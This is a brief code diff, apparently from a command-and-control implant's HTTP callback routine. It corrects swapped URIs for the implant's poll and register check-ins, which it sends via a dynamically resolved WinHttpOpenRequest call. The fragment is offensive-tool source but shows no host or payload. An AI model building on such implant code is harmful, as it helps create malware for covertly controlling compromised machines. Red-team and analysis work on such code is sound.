@@ -60,8 +60,8 @@ HttpCallback(
 
     LPCWSTR lpwUri = NULL;
 
-    if ( dwCbMode == C2_POLL ) { lpwUri = g_Profile.lpwRegister + 1; }
-    if ( dwCbMode == C2_REGISTER ) { lpwUri = g_Profile.lpwPoll + 1; }
+    if ( dwCbMode == C2_POLL ) { lpwUri = g_Profile.lpwPoll + 1; }
+    if ( dwCbMode == C2_REGISTER ) { lpwUri = g_Profile.lpwRegister + 1; }
 
     hRequest = g_Api.WinHttpOpenRequest(
         hConnect,
